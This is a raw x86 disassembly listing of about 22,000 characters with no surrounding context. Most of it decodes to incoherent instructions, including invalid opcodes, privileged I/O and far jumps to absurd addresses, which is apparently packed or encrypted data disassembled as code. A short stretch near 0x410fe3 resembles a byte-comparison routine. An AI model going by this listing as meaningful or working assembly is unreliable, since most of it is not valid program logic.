  410aca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410acb:	sub    BYTE PTR [ebx-0x24],ah
  410ace:	js     0x410a81
  410ad0:	or     dl,BYTE PTR [edx-0x32]
  410ad3:	fs jnp 0x410abf
  410ad6:	icebp  
  410ad7:	xchg   ebp,eax
  410ad8:	add    dh,BYTE PTR [ecx+edx*4]
  410adb:	ret    
  410adc:	xchg   ebx,eax
  410add:	and    BYTE PTR [eax-0x41],bh
  410ae0:	call   0x72fa341e
  410ae5:	scas   eax,DWORD PTR es:[edi]
  410ae6:	icebp  
  410ae7:	imul   edx,DWORD PTR [edx-0x24f05222],0x65
  410aee:	das    
  410aef:	jbe    0x410a93
  410af1:	mov    BYTE PTR [ebp+0x8],bh
  410af4:	pop    es
  410af5:	daa    
  410af6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410af7:	pop    esp
  410af8:	sahf   
  410af9:	mov    edx,0x3a1b4a03
  410afe:	repz cmp eax,0xf7eaaf4d
  410b04:	dec    edi
  410b05:	pop    edx
  410b06:	ror    BYTE PTR ds:0x9f5c0fcc,1
  410b0c:	jns    0x410a9d
  410b0e:	fmul   st,st(2)
  410b10:	loope  0x410b7a
  410b12:	out    0xca,eax
  410b14:	push   ds
  410b15:	sbb    cl,dh
  410b17:	inc    esi
  410b18:	mov    BYTE PTR [ecx-0x4bde3ac8],al
  410b1e:	mov    eax,0x51e0dc38
  410b23:	leave  
  410b24:	hlt    
  410b25:	or     edi,DWORD PTR [eax+0x25f62eca]
  410b2b:	in     eax,dx
  410b2c:	mov    dh,0x49
  410b2e:	mov    cl,0x83
  410b30:	xchg   DWORD PTR [edx+0x29],ecx
  410b33:	xchg   esp,eax
  410b34:	and    dl,ah
  410b36:	dec    edi
  410b37:	repnz int 0xbc
  410b3a:	and    al,0xf1
  410b3c:	inc    ebx
  410b3d:	ja     0x410ae3
  410b3f:	sti    
  410b40:	stos   DWORD PTR es:[edi],eax
  410b41:	fadd   QWORD PTR [ecx-0x4bf3ae7e]
  410b47:	clc    
  410b48:	or     cl,BYTE PTR [eax+0x1e1ae14a]
  410b4e:	push   ecx
  410b4f:	aam    0x43
  410b51:	outs   dx,BYTE PTR ds:[esi]
  410b52:	pop    es
  410b53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b54:	xchg   ecx,eax
  410b55:	sbb    al,0xf8
  410b57:	dec    edi
  410b58:	icebp  
  410b59:	or     DWORD PTR [edx],edi
  410b5b:	ret    0xb8ba
  410b5e:	pop    edx
  410b5f:	shl    DWORD PTR [ecx],cl
  410b61:	retf   0x58f5
  410b64:	jmp    0xdefb:0x4d3ce1cb
  410b6b:	pushf  
  410b6c:	fbstp  TBYTE PTR [ecx+0x1c662cd8]
  410b72:	and    BYTE PTR ds:0xa1889597,al
  410b78:	(bad)  
  410b79:	pop    edx
  410b7a:	hlt    
  410b7b:	loope  0x410b39
  410b7d:	jle    0x410bf5
  410b7f:	mov    ds:0x9789f939,al
  410b84:	and    cl,bh
  410b86:	dec    ebp
  410b87:	push   ebp
  410b88:	or     edx,DWORD PTR [edx-0x69083814]
  410b8e:	pop    eax
  410b8f:	shl    DWORD PTR [edi],1
  410b91:	out    0x49,al
  410b93:	pop    es
  410b94:	mov    bh,0xcf
  410b96:	sbb    al,0x22
  410b98:	mov    al,ds:0x385cb121
  410b9d:	xchg   ebp,eax
  410b9e:	enter  0x710f,0x17
  410ba2:	push   ebp
  410ba3:	jecxz  0x410b82
  410ba5:	in     eax,dx
  410ba6:	or     ch,BYTE PTR [ecx]
  410ba8:	loope  0x410b6c
  410baa:	cli    
  410bab:	jno    0x410c24
  410bad:	and    BYTE PTR [ebp+ecx*4+0x110d55e0],bl
  410bb4:	or     eax,0x63c01c0e
  410bb9:	int3   
  410bba:	inc    ecx
  410bbb:	mov    edx,0x8fd42198
  410bc0:	pop    edx
  410bc1:	stc    
  410bc2:	jb     0x410b65
  410bc4:	stos   BYTE PTR es:[edi],al
  410bc5:	stos   BYTE PTR es:[edi],al
  410bc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bc7:	fnstcw WORD PTR [ecx+0x38]
  410bca:	or     cl,BYTE PTR [ebx-0x7a]
  410bcd:	daa    
  410bce:	sub    bl,al
  410bd0:	or     al,0x29
  410bd2:	out    0x13,al
  410bd4:	pop    edi
  410bd5:	mov    ah,0x36
  410bd7:	lods   eax,DWORD PTR ds:[esi]
  410bd8:	clc    
  410bd9:	sahf   
  410bda:	lea    eax,[ebx+0x62131918]
  410be0:	mov    ebp,0xf6c68878
  410be5:	mov    eax,0x709ddde5
  410bea:	lds    ebp,FWORD PTR [edx+ecx*2]
  410bed:	xchg   esp,eax
  410bee:	mov    DWORD PTR [esi+0xe18c808],eax
  410bf4:	xor    ah,bl
  410bf6:	or     BYTE PTR [edx-0x7b],bh
  410bf9:	fadd   DWORD PTR [ebp-0x59]
  410bfc:	ins    DWORD PTR es:[edi],dx
  410bfd:	mov    ds:0xcadb9974,eax
  410c02:	sbb    ecx,DWORD PTR [ebp-0x7d095536]
  410c08:	or     ch,BYTE PTR [eax+eax*2+0x12a1d17]
  410c0f:	mov    ebx,0xce8f0992
  410c14:	or     esi,DWORD PTR [ebp-0x713fc343]
  410c1a:	popa   
  410c1b:	mov    ecx,0x9d59f111
  410c20:	push   ebp
  410c21:	jle    0x410c9b
  410c23:	jmp    0x6cff:0x36f4fe14
  410c2a:	adc    esi,esi
  410c2c:	cmp    BYTE PTR [edi],0x50
  410c2f:	in     al,dx
  410c30:	clc    
  410c31:	jae    0x410c3d
  410c33:	je     0x410bc3
  410c35:	cwde   
  410c36:	stc    
  410c37:	dec    esp
  410c38:	cmp    bh,dh
  410c3a:	and    BYTE PTR [edx-0x368f8930],dl
  410c40:	ins    BYTE PTR es:[edi],dx
  410c41:	jge    0x410c5e
  410c43:	aad    0x8d
  410c45:	fdivrp st(4),st
  410c47:	rcr    esi,0xa4
  410c4a:	cmp    al,0x63
  410c4c:	cs sbb eax,0xb9786c23
  410c52:	push   cs
  410c53:	(bad)  
  410c55:	push   cs
  410c56:	dec    edi
  410c57:	jb     0x410ca0
  410c59:	scas   eax,DWORD PTR es:[edi]
  410c5a:	out    dx,al
  410c5b:	mov    dh,0xad
  410c5d:	add    DWORD PTR [ebx+0x5b99eb42],edx
  410c63:	dec    ebx
  410c64:	mov    ah,0xff
  410c66:	add    edi,ebx
  410c68:	xor    al,0xfe
  410c6a:	mov    edi,0xdc6ea234
  410c6f:	xor    esp,DWORD PTR [eax]
  410c71:	mov    edx,0xa87c1c5a
  410c76:	mov    BYTE PTR [edx-0x36dbf64a],ah
  410c7c:	fcmovnb st,st(2)
  410c7e:	fnstsw WORD PTR [eax-0x3e138d98]
  410c84:	pop    ds
  410c85:	xchg   ecx,eax
  410c86:	dec    esp
  410c87:	sbb    BYTE PTR [eax+0x10aee512],dh
  410c8d:	cmp    al,0x3d
  410c8f:	inc    eax
  410c90:	lods   al,BYTE PTR ss:[esi]
  410c92:	mov    al,0xc6
  410c94:	adc    eax,0x64e069b4
  410c99:	dec    ebp
  410c9a:	or     DWORD PTR [eax+0x500072b8],0xbe774ab0
  410ca4:	mov    WORD PTR [eax+0x25],ss
  410ca7:	jbe    0x410cba
  410ca9:	sbb    edx,DWORD PTR [ebp-0x58e6f1d3]
  410caf:	imul   eax,DWORD PTR [ebx-0x6c],0xc6e21c7f
  410cb6:	imul   edx,DWORD PTR [ecx+0x23],0xffffffe0
  410cba:	pop    ebx
  410cbb:	out    dx,al
  410cbc:	lds    eax,FWORD PTR [eax-0x55]
  410cbf:	stc    
  410cc0:	xchg   bl,cl
  410cc2:	imul   esi,DWORD PTR [esi+0x56ce0fd8],0x50c077a7
  410ccc:	push   esi
  410ccd:	mov    eax,ds:0xf53d4593
  410cd2:	mov    dh,0x93
  410cd4:	sbb    ch,ch
  410cd6:	mov    ebp,0xb5cbfa23
  410cdb:	pushf  
  410cdc:	jae    0x410cdc
  410cde:	iret   
  410cdf:	xchg   DWORD PTR [ebp-0x1d],esi
  410ce2:	xchg   BYTE PTR [edx+0x5772d2f8],dh
  410ce8:	rcl    DWORD PTR [ebp+0x36c0d630],1
  410cee:	rol    DWORD PTR [edx+esi*8+0x22],1
  410cf2:	je     0x410cc5
  410cf4:	xor    ebp,ebx
  410cf6:	in     al,dx
  410cf7:	sub    BYTE PTR [esi+edx*2+0x62],dl
  410cfb:	cmp    eax,0xf02d13a4
  410d00:	mov    edx,ecx
  410d02:	pop    ds
  410d03:	test   al,0xb2
  410d05:	arpl   WORD PTR [esi+0x4e],di
  410d08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d09:	mov    ah,bh
  410d0b:	out    0x89,al
  410d0d:	add    cl,BYTE PTR [ebx-0x361607bb]
  410d13:	add    al,BYTE PTR [eax]
  410d15:	add    BYTE PTR [eax+ebp*1-0x2a],dh
  410d19:	push   cs
  410d1a:	push   edx
  410d1b:	lock je 0x410d8e
  410d1e:	outs   dx,BYTE PTR ds:[esi]
  410d1f:	dec    ecx
  410d20:	mov    edi,0xe973d39c
  410d25:	sahf   
  410d26:	jmp    0x410ce0
  410d28:	jle    0x410da8
  410d2a:	scas   eax,DWORD PTR es:[edi]
  410d2b:	jl     0x410dab
  410d2d:	jle    0x410d73
  410d2f:	inc    edx
  410d30:	pop    ecx
  410d31:	sbb    esp,eax
  410d33:	adc    eax,0xcb6b9e8b
  410d38:	xchg   esi,eax
  410d39:	(bad)  
  410d3a:	leave  
  410d3b:	cmp    BYTE PTR [ebp+0x52162c79],bh
  410d41:	and    eax,0x9e82c7c7
  410d46:	(bad)  
  410d47:	call   0x4e73:0x72890c56
  410d4e:	mov    dl,0x46
  410d50:	scas   eax,DWORD PTR es:[edi]
  410d51:	push   esp
  410d52:	adc    ebp,DWORD PTR [edx+0x74]
  410d55:	(bad)  
  410d56:	jno    0x410ce1
  410d58:	or     dh,BYTE PTR [edi-0x7a]
  410d5b:	ja     0x410d5d
  410d5d:	jmp    0xe768ac99
  410d62:	stos   BYTE PTR es:[edi],al
  410d63:	ins    BYTE PTR es:[edi],dx
  410d64:	or     al,BYTE PTR [ebp+0x7b87936f]
  410d6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d6b:	pop    ds
  410d6c:	mov    esi,0x5ab34a03
  410d71:	aam    0x5
  410d73:	icebp  
  410d74:	loop   0x410d10
  410d76:	add    dl,BYTE PTR [ebp-0x7fbe1ef9]
  410d7c:	fdiv   DWORD PTR [esi-0x1f]
  410d7f:	jl     0x410d55
  410d81:	je     0x410dd4
  410d83:	push   esp
  410d84:	push   ecx
  410d85:	outs   dx,BYTE PTR ds:[esi]
  410d86:	fcomp  DWORD PTR [eax+0x3910a323]
  410d8c:	addr16 dec ebx
  410d8e:	jmp    FWORD PTR [ebx-0x3e]
  410d91:	das    
  410d92:	xchg   ecx,eax
  410d93:	rcr    BYTE PTR [eax],1
  410d95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d96:	into   
  410d97:	adc    eax,esi
  410d99:	xchg   esp,eax
  410d9a:	inc    esp
  410d9b:	dec    edi
  410d9c:	or     BYTE PTR [edx+0x68],ah
  410d9f:	and    esi,DWORD PTR [edi]
  410da1:	sub    al,0xa7
  410da3:	dec    edx
  410da4:	xchg   ecx,eax
  410da5:	retf   0x8724
  410da8:	and    DWORD PTR [ebp-0x2ccb20c4],ecx
  410dae:	sub    DWORD PTR [esi+0x23537ab5],esp
  410db4:	bound  edi,QWORD PTR [eax]
  410db6:	xor    ebp,DWORD PTR [edx+0x33]
  410db9:	xchg   ebx,ebx
  410dbb:	adc    DWORD PTR [ebx+eiz*1],esi
  410dbe:	mov    bl,0x5f
  410dc0:	pop    ss
  410dc1:	int    0x1d
  410dc3:	mov    esp,0xcf268a8b
  410dc8:	fmul   QWORD PTR [edx]
  410dca:	jecxz  0x410dee
  410dcc:	mov    ch,0xa5
  410dce:	adc    BYTE PTR [eax],ch
  410dd0:	xor    eax,0x188533fd
  410dd5:	sub    DWORD PTR [ecx-0x2d],esp
  410dd8:	in     eax,dx
  410dd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410dda:	jle    0x410d75
  410ddc:	sar    DWORD PTR [edi],cl
  410dde:	(bad)  
  410ddf:	jmp    0x410d93
  410de1:	sbb    al,0x58
  410de3:	cdq    
  410de4:	enter  0xd4cf,0xa8
  410de8:	pop    ds
  410de9:	int3   
  410dea:	fdiv   DWORD PTR ds:0xb83ef8c5
  410df0:	mov    ds:0x5e5fa7f8,eax
  410df5:	sub    eax,DWORD PTR [edi+0x13c6cd31]
  410dfb:	dec    ebx
  410dfc:	cmp    al,0x3a
  410dfe:	adc    al,0x77
  410e00:	hlt    
  410e01:	jb     0x410e5d
  410e03:	or     eax,0x358cff3
  410e08:	sub    eax,0x82273ee2
  410e0d:	stos   DWORD PTR es:[edi],eax
  410e0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e0f:	test   al,0x2f
  410e11:	mov    ecx,0xe7193ec6
  410e16:	fs js  0x410dfa
  410e19:	mov    eax,edx
  410e1b:	pop    eax
  410e1c:	dec    ebx
  410e1d:	push   edx
  410e1e:	dec    ecx
  410e1f:	data16 or BYTE PTR [ebx-0x4d],bh
  410e23:	js     0x410dfd
  410e25:	ja     0x410df9
  410e27:	mov    esp,0xc97c3d4
  410e2c:	(bad)  
  410e2d:	adc    ebx,DWORD PTR [ebx-0x76]
  410e30:	sub    dh,BYTE PTR [edx-0x70386f63]
  410e36:	mov    eax,ebp
  410e38:	imul   ecx,DWORD PTR [eax+0xf00d7ef],0xffffffff
  410e3f:	adc    eax,0xe855d16f
  410e44:	(bad)  
  410e45:	jae    0x410dca
  410e47:	repnz lahf 
  410e49:	adc    al,0xab
  410e4b:	daa    
  410e4c:	sub    DWORD PTR [ebp+0x68],ecx
  410e4f:	ret    
  410e50:	mov    edi,0xd8276af8
  410e55:	xor    eax,0x1d4eab09
  410e5a:	aas    
  410e5b:	jbe    0x410e3d
  410e5d:	push   eax
  410e5e:	inc    esp
  410e5f:	inc    edx
  410e60:	aaa    
  410e61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e62:	call   0xdb3e3e9e
  410e67:	mov    esp,esi
  410e69:	xor    bh,BYTE PTR [eax+0x48]
  410e6c:	xor    DWORD PTR [ebx-0x76c000c],edi
  410e72:	add    edx,DWORD PTR [edx]
  410e74:	fcom   DWORD PTR [ebx]
  410e76:	lds    edx,FWORD PTR [esi+0x4b]
  410e79:	nop
  410e7a:	(bad)  
  410e7b:	sub    al,0xbd
  410e7d:	cs repnz test eax,edx
  410e81:	jbe    0x410e59
  410e83:	cmc    
  410e84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e85:	pop    esi
  410e86:	xchg   BYTE PTR [edi],dh
  410e88:	push   esp
  410e89:	ror    esi,1
  410e8b:	and    DWORD PTR [esi-0x61b08c9e],0xa48dd592
  410e95:	pop    ecx
  410e96:	leave  
  410e97:	lds    eax,FWORD PTR [edi+0x193d670b]
  410e9d:	pop    esp
  410e9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e9f:	mov    esi,0x84cf886d
  410ea4:	leave  
  410ea5:	test   BYTE PTR [eax],bh
  410ea7:	or     bl,BYTE PTR [esi]
  410ea9:	mov    ds:0x387f210f,al
  410eae:	and    eax,0x3e7b9b44
  410eb3:	push   ss
  410eb4:	or     BYTE PTR [edx],0x88
  410eb7:	inc    edi
  410eb8:	or     BYTE PTR [edx+0x1f],bl
  410ebb:	adc    eax,DWORD PTR [edi]
  410ebd:	inc    edx
  410ebe:	cmp    ah,BYTE PTR [esi+0x6b]
  410ec1:	xchg   edx,eax
  410ec2:	adc    ch,BYTE PTR [edx-0x66]
  410ec5:	xor    DWORD PTR [eax-0x46e9811d],ecx
  410ecb:	aaa    
  410ecc:	fnstenv [eax]
  410ece:	mov    ebp,0x38b66ab5
  410ed3:	push   esp
  410ed4:	bound  esp,QWORD PTR [ebp+edx*1+0x7c]
  410ed8:	cmc    
  410ed9:	push   esi
  410eda:	xor    dl,BYTE PTR [edx*4-0x15eba649]
  410ee1:	mov    edi,0xc9fe27f4
  410ee6:	test   al,0x4a
  410ee8:	clc    
  410ee9:	(bad)  
  410eeb:	cld    
  410eec:	cmp    DWORD PTR [ecx+0x76437456],0xffffffad
  410ef3:	sar    dh,0xd8
  410ef6:	or     cl,BYTE PTR [esp+edx*2-0x9]
  410efa:	in     eax,dx
  410efb:	push   eax
  410efc:	inc    ebp
  410efd:	scas   eax,DWORD PTR es:[edi]
  410efe:	xor    eax,0xc48e4973
  410f03:	sub    eax,0xffffffaf
  410f06:	pusha  
  410f07:	stos   BYTE PTR es:[edi],al
  410f08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f09:	push   0x879b3fa6
  410f0e:	sbb    DWORD PTR [edx],eax
  410f10:	mov    ah,0xde
  410f12:	xchg   esp,eax
  410f13:	scas   al,BYTE PTR es:[edi]
  410f14:	pop    edi
  410f15:	adc    eax,0x58d64679
  410f1a:	shr    bh,cl
  410f1c:	lahf   
  410f1d:	clc    
  410f1e:	test   ch,cl
  410f20:	aaa    
  410f21:	ss jno 0x410f27
  410f24:	push   esi
  410f25:	lahf   
  410f26:	imul   ebp,DWORD PTR [esi],0x7b411a1
  410f2c:	int    0xfd
  410f2e:	popa   
  410f2f:	dec    eax
  410f30:	les    ebx,FWORD PTR [ecx+0x517ae591]
  410f36:	push   edx
  410f37:	mov    al,ds:0x53227102
  410f3c:	ret    0x9d8e
  410f3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f40:	shl    DWORD PTR [ecx],0x2f
  410f43:	and    al,0xad
  410f45:	iret   
  410f46:	push   ss
  410f47:	inc    eax
  410f48:	dec    edi
  410f49:	inc    esi
  410f4a:	xchg   esi,eax
  410f4b:	mov    BYTE PTR [ebx+0x16afa007],cl
  410f51:	bound  edi,QWORD PTR [ecx+0x2b]
  410f54:	outs   dx,DWORD PTR ds:[esi]
  410f55:	nop
  410f56:	fisubr DWORD PTR [esi-0x2a825030]
  410f5c:	lods   al,BYTE PTR ds:[esi]
  410f5d:	adc    DWORD PTR [esi],0x5ae8efe6
  410f63:	xchg   ebx,eax
  410f64:	pushf  
  410f65:	test   DWORD PTR [esi-0x136abffd],0x9d7bd65a
  410f6f:	and    ebp,ecx
  410f71:	ret    0x100b
  410f74:	sbb    BYTE PTR [edx],0x79
  410f77:	and    ebx,DWORD PTR [ebx-0x43]
  410f7a:	pop    ecx
  410f7b:	popa   
  410f7c:	push   edi
  410f7d:	std    
  410f7e:	mov    edi,0xb5a0fd48
  410f83:	ins    DWORD PTR es:[edi],dx
  410f84:	sahf   
  410f85:	mov    eax,0x7fa8708e
  410f8a:	xor    bl,BYTE PTR [ecx+0x60]
  410f8d:	sbb    DWORD PTR [esi],ebx
  410f8f:	mov    esi,0x313b96d7
  410f94:	and    eax,0x6894bbb3
  410f99:	iret   
  410f9a:	dec    eax
  410f9b:	push   ds
  410f9c:	or     ebp,DWORD PTR [ebx]
  410f9e:	cmp    eax,0x53e01114
  410fa3:	or     al,0x10
  410fa5:	jmp    0x410f33
  410fa7:	jb     0x410f7e
  410fa9:	xchg   ecx,eax
  410faa:	jp     0x410f60
  410fac:	pop    ebp
  410fad:	lea    ebx,[edx-0x68f51ff0]
  410fb3:	unpcklps xmm5,XMMWORD PTR [esi+0x40]
  410fb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fb8:	retf   0x44c9
  410fbb:	fstp   QWORD PTR [edi+0x23988c12]
  410fc1:	mov    ch,0x77
  410fc3:	sub    esp,DWORD PTR ss:[ebp-0x5fa6e24a]
  410fca:	mov    ch,0x18
  410fcc:	into   
  410fcd:	xchg   esp,eax
  410fce:	mov    dh,0xcd
  410fd0:	sbb    DWORD PTR [ebx],edi
  410fd2:	sar    ch,cl
  410fd4:	nop
  410fd5:	sub    eax,DWORD PTR [ecx]
  410fd7:	jne    0x410f5e
  410fd9:	ret    0x6b11
  410fdc:	sub    BYTE PTR [eax],ah
  410fde:	les    esi,FWORD PTR [ebx]
  410fe0:	rol    DWORD PTR [ebx],0xc6
  410fe3:	mov    DWORD PTR [ebp+0x8],eax
  410fe6:	mov    eax,DWORD PTR [ebp+0x8]
  410fe9:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fed:	mov    dl,BYTE PTR [ebp-0x1]
  410ff0:	cmp    al,dl
  410ff2:	je     0x411303
  410ff8:	mov    eax,DWORD PTR [ebp+0x8]
  410ffb:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fff:	mov    edx,DWORD PTR [ebp+0xc]
  411002:	cmp    al,BYTE PTR [edx]
  411004:	jne    0x4115f7
  41100a:	mov    eax,DWORD PTR [ebp-0x8]
  41100d:	mov    edx,DWORD PTR [ebp+0xc]
  411010:	movsx  edx,BYTE PTR [edx]
  411013:	xor    eax,ecx
  411015:	add    eax,esi
  411017:	cmp    edx,eax
  411019:	jmp    0x4112e7
  41101e:	jmp    0x411054
  411020:	push   esp
  411021:	dec    ebx
  411022:	push   ecx
  411023:	imul   esi,ecx,0xffffffb4
  411026:	and    DWORD PTR [edx-0x16],esi
  411029:	loope  0x41108e
  41102b:	add    edx,DWORD PTR [eax-0x60]
  41102e:	sbb    BYTE PTR [edi+0x7e],al
  411031:	jle    0x410fe2
  411033:	jl     0x4110b3
  411035:	jle    0x41103b
  411037:	stos   BYTE PTR es:[edi],al
  411038:	hlt    
  411039:	pop    ds
  41103a:	mov    ch,0xb2
  41103c:	cmp    bh,BYTE PTR [esi+edi*2-0x30e3e31c]
  411043:	mov    fs,edx
  411045:	xchg   ebp,eax
  411046:	xchg   BYTE PTR [edi+0x43d97a99],ah
  41104c:	bound  ecx,QWORD PTR [ebp+0x1a]
  41104f:	arpl   WORD PTR [eax+0x35e3b0d6],ax
  411055:	nop
  411056:	pop    eax
  411057:	mov    eax,0x87f71b47
  41105c:	ret    
  41105d:	cli    
  41105e:	mov    bh,0x38
  411060:	cld    
  411061:	stos   DWORD PTR es:[edi],eax
  411062:	sub    BYTE PTR [ebx+0x3d],bl
  411065:	sub    esi,DWORD PTR [edi+0x18]
  411068:	jge    0x411024
  41106a:	fidiv  WORD PTR [esi+edx*4-0x779d59a9]
  411071:	sbb    bl,dl
  411073:	mov    dl,0x43
  411075:	fstp   QWORD PTR [esi+0x74]
  411078:	jns    0x411087
  41107a:	mov    esp,0xc3b5a73e
  41107f:	pop    ebp
  411080:	retf   
  411081:	sub    DWORD PTR [esi-0x1731d97f],edi
  411087:	in     eax,0x4
  411089:	push   es
  41108a:	daa    
  41108b:	xchg   esi,eax
  41108c:	sub    DWORD PTR [ebx+0x54],esp
  41108f:	xor    bl,0x1a
  411092:	icebp  
  411093:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411094:	dec    ebp
  411095:	lock pop es
  411097:	imul   eax,DWORD PTR [esp+ebx*2],0xfffffff6
  41109b:	fs pop ebx
  41109d:	aad    0xfb
  41109f:	cs test eax,0xe427d77b
  4110a5:	add    al,0xe5
  4110a7:	neg    DWORD PTR [ebx+0x15]
  4110aa:	pop    eax
  4110ab:	enter  0x125d,0x59
  4110af:	popa   
  4110b0:	inc    BYTE PTR [ebx+0x7bbee585]
  4110b6:	xor    al,0x49
  4110b8:	xor    DWORD PTR [ebx-0x1ecf4c6e],edx
  4110be:	(bad)
  4110c2:	repz mov ecx,0xcdf2f83c
  4110c8:	or     edi,DWORD PTR [ecx]
  4110ca:	mov    ch,0xa6
  4110cd:	mov    bl,0x47
  4110cf:	and    eax,DWORD PTR [edx-0x6d]
  4110d2:	mov    ebx,0x1e409a21
  4110d7:	adc    eax,0xa174f887
  4110dc:	js     0x41113b
  4110de:	cld    
  4110df:	adc    bl,ah
  4110e1:	or     DWORD PTR [ebp-0x3f],ebx
  4110e4:	adc    al,0x96
  4110e6:	sar    DWORD PTR [esi+esi*4-0x1a],cl
  4110ea:	shl    BYTE PTR [edi+esi*1],0xd4
  4110ee:	dec    esi
  4110ef:	cmp    eax,0x63baf44e
  4110f4:	and    BYTE PTR [esi-0x3e87ee7],dl
  4110fa:	test   eax,0x6eb5ae7f
  4110ff:	retf   
  411100:	das    
  411101:	pushf  
  411102:	data16 jg 0x41110b
  411105:	xchg   ebp,eax
  411106:	xchg   DWORD PTR gs:[eax-0x68],ecx
  41110a:	mov    cl,0x6b
  41110c:	and    dh,BYTE PTR [ebx+0x6b7df367]
  411112:	or     al,0x12
  411114:	dec    ebp
  411115:	data16 mov al,0xbd
  411118:	inc    esi
  411119:	rol    BYTE PTR [esi+0x34dbc8e7],0x8e
  411120:	loop   0x411171
  411122:	xchg   ebp,eax
  411123:	mov    bl,0x4b
  411126:	or     edi,DWORD PTR [edi-0x6e2ba83c]
  41112c:	mov    ch,0xf2
  41112e:	jbe    0x4110c9
  411130:	lods   al,BYTE PTR ds:[esi]
  411131:	icebp  
  411132:	inc    eax
  411133:	mov    bh,BYTE PTR [eax+0x6a0391c9]
  411139:	fwait
  41113a:	or     eax,0xbf3226ae
  41113f:	push   edx
  411140:	in     eax,0xb5
  411142:	or     dh,BYTE PTR [ebx+0x56aeae4d]
  411148:	(bad)  
  411149:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41114a:	fld    QWORD PTR [esi-0x2c44ab60]
  411150:	(bad)  
  411151:	in     al,dx
  411152:	pop    ecx
  411153:	vpcmpgtw ymm5,ymm6,YMMWORD PTR [edx]
  411157:	and    DWORD PTR [ebp+ebp*2+0x494a6738],ebx
  41115e:	jle    0x411188
  411160:	mov    ds:0x349007f7,eax
  411165:	ins    DWORD PTR es:[edi],dx
  411166:	scas   eax,DWORD PTR es:[edi]
  411167:	mov    edi,0x9b8a05c1
  41116c:	sahf   
  41116d:	fsubr  st(4),st
  41116f:	push   ecx
  411170:	cmp    edx,DWORD PTR [esi+0x20]
  411173:	call   0xeb14:0xbf44d15d
  41117a:	call   0x7eb7c696
  41117f:	fsubr  QWORD PTR [ecx+0x53]
  411182:	mov    cl,0x33
  411184:	sub    esi,DWORD PTR [edx+0x285f0111]
  41118a:	lea    eax,[eax+0x64]
  41118d:	int    0x7e
  41118f:	mov    ebp,0xfc790f1f
  411194:	cmc    
  411195:	jg     0x4111ad
  411197:	add    al,0x53
  411199:	push   esp
  41119a:	xor    DWORD PTR [esi+0x3be092a5],esi
  4111a0:	pop    es
  4111a1:	or     al,0xd7
  4111a3:	out    0x25,al
  4111a5:	jg     0x4111af
  4111a7:	cld    
  4111a8:	les    esi,FWORD PTR ds:0x5a78bd16
  4111ae:	sub    bh,0x5c
  4111b1:	push   ebp
  4111b2:	cmp    eax,0x1d196ce0
  4111b7:	icebp  
  4111b8:	mov    WORD PTR [esi],fs
  4111ba:	scas   al,BYTE PTR es:[edi]
  4111bb:	dec    ebx
  4111bc:	dec    eax
  4111bd:	jge    0x41115b
  4111bf:	and    DWORD PTR cs:[ebx-0x6e],0x5dac78ec
  4111c7:	push   es
  4111c8:	pop    ds
  4111c9:	inc    ebp
  4111ca:	ja     0x411228
  4111cc:	xor    BYTE PTR [edx+0x23727863],al
  4111d2:	mov    cl,0x54
  4111d4:	cwde   
  4111d5:	xlat   BYTE PTR ds:[ebx]
  4111d6:	fst    QWORD PTR [esi]
  4111d8:	pop    eax
  4111d9:	jae    0x411204
  4111db:	ret    0xca3e
  4111de:	ffreep st(1)
  4111e0:	hlt    
  4111e1:	pop    eax
  4111e2:	inc    DWORD PTR [edx-0x257a319b]
  4111e8:	mov    esi,0x2bced506
  4111ed:	ins    DWORD PTR es:[edi],dx
  4111ee:	cli    
  4111ef:	in     al,dx
  4111f0:	dec    ebx
  4111f1:	dec    eax
  4111f2:	dec    ebp
  4111f3:	cs (bad) 
  4111f5:	mov    ah,0xdc
  4111f7:	stos   BYTE PTR es:[edi],al
  4111f8:	adc    eax,0x520b07c4
  4111fd:	cmp    eax,0x48522bc9
  411202:	jae    0x4111d4
  411204:	ins    DWORD PTR es:[edi],dx
  411205:	ins    DWORD PTR es:[edi],dx
  411206:	es add al,0x8d
  411209:	xor    al,0xd1
  41120b:	rol    BYTE PTR [esp+eax*8],0xdd
  41120f:	rcr    BYTE PTR [edx+0x158d8824],1
  411215:	jo     0x41126b
  411217:	push   eax
  411218:	sub    DWORD PTR [ebx],0x74
  41121b:	mov    bh,0xe2
  41121d:	mov    ecx,0xcd3e79c4
  411222:	add    DWORD PTR [ecx],0xac0a7852
  411228:	rol    ch,cl
  41122a:	stc    
  41122b:	int    0x67
  41122d:	sti    
  41122e:	add    bh,BYTE PTR [ebp-0x52b5e98a]
  411234:	outs   dx,BYTE PTR ds:[esi]
  411235:	inc    edx
  411236:	or     dh,ah
  411238:	jge    0x411202
  41123a:	loopne 0x41124b
  41123c:	in     al,0x31
  41123e:	std    
  41123f:	add    DWORD PTR [ecx],ebx
  411241:	mov    DWORD PTR [ebp-0x53],esi
  411244:	lds    ebx,FWORD PTR [ecx]
  411246:	adc    eax,0x7f5368a
  41124b:	sub    DWORD PTR [eax+eax*4],edi
  41124e:	mov    esi,0x9bed87a0
  411253:	xor    al,0xf3
  411255:	jmp    0x411294
  411257:	push   eax
  411258:	add    eax,0xd81e5f4e
  41125d:	mov    ebp,0xcd3f7fb5
  411262:	xchg   esp,eax
  411263:	lock (bad) ds:0x6b02afbf
  41126a:	mov    ecx,0xcb17e3d1
  41126f:	pop    esp
  411270:	pop    ds
  411271:	(bad)  
  411273:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
